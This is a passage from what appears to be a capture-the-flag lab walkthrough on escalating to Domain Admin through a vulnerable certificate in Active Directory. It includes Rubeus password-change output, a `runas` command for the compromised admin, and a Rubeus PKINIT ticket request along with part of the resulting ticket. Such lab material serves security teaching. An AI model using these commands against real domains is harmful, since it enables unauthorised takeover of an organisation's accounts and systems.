        [*] Building Authenticator with encryption key type: aes256_cts_hmac_sha1
        [*] base64(session subkey): UP+L2OgmJ281TkkXYNKR0ahLJni1fIk/XMBFwwNTP7Q=
        [*] Building the KRV-PRIV structure
        [+] Password change success!
```
You can now authenticate as this user to the Domain Controller and recover the final flag. Well done! You have now compromised DA! As an added bonus, let's look at the `runas` command, which we can use to authenticate as another user in the command prompt. We can use the following command in cmd to authenticate as the now compromised DA user:
`runas /user:lunar.eruca.com\<username of DA> cmd.exe   `
You will be prompted to provide the password for the associated account. If correct, `runas` will spawn a command prompt window for you as the specified user, which you can now use for administrative duties.
Answer the questions below
```text
C:\Users\thm>cd C:\THMTools\

C:\THMTools>dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\THMTools

01/20/2022  03:35 PM    <DIR>          .
01/20/2022  03:35 PM    <DIR>          ..
10/22/2021  11:01 AM           417,280 Rubeus.exe
               1 File(s)        417,280 bytes
               2 Dir(s)  51,866,243,072 bytes free

C:\THMTools>.\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:C:\Users\thm\Desktop\vulncert.pfx /password:Password1@ /outfile:svc.gitlab.kirbi /domain:lunar.eruca.com /dc:10.10.221.143

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
[*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\svc.gitlab'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk
      MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC
      BJYPsuWDafrAyIY0Rcux/m9GMthjfDDY4seeaNYu92HXisjJgYk+urTb8F9wt04dLeojYjUn64+b8vet
      JSAJIqHYqZXpkrpidsLmc4GMvKKlnETYE6mJGlcd7aiF9RjWM8Ft9g3Aw48zTCtChVlR98VdkYRGU8OV
      BQyVzFRofONc+nw0iBrQDAL+2j2epiq7mKxE81GlP72YbzPycKH3ltHbokIkh21HuZIKX/fThXnPl92K
      8IpNnHgGJnnFe3bP4juhV/L5uDBjjh7Yv6UAL1W62oA8D8jyS0Wgu+J85UClUBhrOfJ0IhnhzGeV3XFi
      /hSqDIzC4u1riwIPNz20l46NomOpXyu0kbSSGlQq7nzKi8+37CvcKTT3YwaHSgpycll6gxtE+5x+5w5K
      FbgeA6ea2yJ3L8wSt+IRZE2g92oXxc+KUGFSKgcE+5tuFcXq1fyHxbjo+MePLu2Q4gz61HjbSq65bVRW
      c0rLS2TCDNlXDJpcaoitRBSH3RDcA/jieulJHUATfHm0bbXCO+7pH0RgVMAKGiBiHtBPzXnrzJv/AfeX
      4CmyYwd5qIrJOMvj/qBnR9I2nvHXLakVDPYgNYfp+zcNlzxwfwXgYQOSzehh+hHL7uBvXLBTjugnxkh2
      L8JJe/3Wy4+z4V6AsWhQLx8Z7MIy3WnuksuEz8ga3e2Ctf8XMgQQpFyAybOtFritZz/adXL+pKfkh6Kc
      Px7WrCUYX/Sy6XHBe1abMEA9bfSousjh7U9eeJoJKfPXUQwtDPCYOf9xkagJoSQzSY8joVtoIOTSCW4g
